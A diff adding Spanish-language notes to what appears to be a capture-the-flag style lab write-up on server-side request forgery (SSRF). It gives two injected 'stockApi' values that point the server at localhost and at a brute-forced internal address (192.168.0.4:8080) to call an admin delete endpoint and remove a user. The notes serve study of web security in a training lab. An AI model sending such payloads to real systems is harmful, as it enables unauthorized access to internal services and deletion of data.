@@ -10,3 +10,26 @@ Para este laboratorio nos damos cuenta que la peticion para revisar stock llama 
 entonces sopechamos que podemos que puede hacer peticiones a nombre del servidor
 
 
+```
+stockApi=http://localhost/admin/delete?username=carlos
+
+
+```
+Y borramos el usuario.
+
+
+## Basic SSRF against another back-end system
+
+Para este laboratorio usamos el intruder en el stock usamos el intruder con el payload brute force del 1 al 255
+recordar usar el url encode.
+
+
+```
+stockApi=http://192.168.0.4:8080/admin/delete?username=carlos
+
+```
+
+Y borramos el usuario.
+
+
+
